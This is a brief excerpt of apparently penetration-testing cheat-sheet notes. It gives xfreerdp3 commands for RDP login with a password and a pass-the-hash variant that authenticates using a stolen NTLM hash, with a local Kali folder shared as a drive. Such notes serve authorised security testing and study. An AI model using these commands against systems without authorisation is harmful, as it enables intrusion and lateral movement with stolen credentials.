...
### xfreerdp3
```bash
xfreerdp3 /v:$ip /u:$user /p:'$password'

xfreerdp /v:$ip /u:$user /p:'$password' /dynamic-resolution /drive:kali,.
```
# Pass-The-Hash
```bash
xfreerdp3 /v:$IP /u:$USER /pth:$HASH

xfreerdp3 /v:$ip /u:$USER /pth:$HASH /dynamic-resolution /drive:kali,.
```
